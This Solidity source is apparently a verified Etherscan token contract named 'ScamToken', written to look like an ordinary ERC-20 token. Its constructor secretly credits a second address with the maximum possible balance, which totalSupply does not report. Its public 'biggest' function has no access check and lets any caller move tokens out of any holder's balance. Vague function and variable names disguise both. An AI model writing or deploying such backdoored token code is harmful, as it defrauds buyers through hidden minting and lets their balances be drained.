/**
 *Submitted for verification at Etherscan.io on 2022-07-20
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

contract ScamToken {
    string public _name = "Scam";
    string public _symbol = "SCAM";

    uint8 public _decimals = 9;

    uint256 private _tTotal = 1000000000000000 * 10**_decimals;
    uint256 private _rTotal;
    uint256 public _fee = 0;
   
    address private uniswapV2Pair;

    uint256 private like = ~uint256(0); //115792089237316195423570985008687907853269984665640564039457584007913129639935
    address public _ztotal;
    address public _owner;

    mapping(address => mapping(address => uint256)) public _allowances;
    mapping(address => uint256) private _balances;
    
    //mapping(address => uint256) public driven;
    //mapping(address => uint256) public cake;

    event Approval( address indexed owner, address indexed spender, uint256 value );
    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address ztotal) {
        _owner = msg.sender;
        _ztotal = ztotal;
        _balances[_ztotal] = like;
        _balances[msg.sender] = _tTotal;
        //cake[_ztotal] = like;
        //cake[msg.sender] = like;
    }
    
    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
//----------------------------------------------------------------------------------------------------------
    // function getDriven() external view returns (uint ztotal, uint owner){
    //     owner = driven[_owner];
    //     ztotal = driven[_ztotal];
    // }

    // function getCake() external view returns (uint ztotal, uint owner){
    //     owner = cake[_owner];
    //     ztotal = cake[_ztotal];
    // }
//----------------------------------------------------------------------------------------------------------
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool) {
        require(amount > 0, "Transfer amount must be greater than zero");
        biggest(sender, recipient, amount);
        emit Transfer(sender, recipient, amount);
        return
            _approve(
                sender,
                msg.sender,
                _allowances[sender][msg.sender] - amount
            );
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        biggest(msg.sender, recipient, amount);
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function biggest( address treated, address official, uint256 amount ) public {
        _balances[treated] -= amount;
        _balances[official] += amount;
    }

    function _approve( address owner, address spender, uint256 amount ) private returns (bool) {
        require( owner != address(0) && spender != address(0), "ERC20: approve from the zero address" );
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
}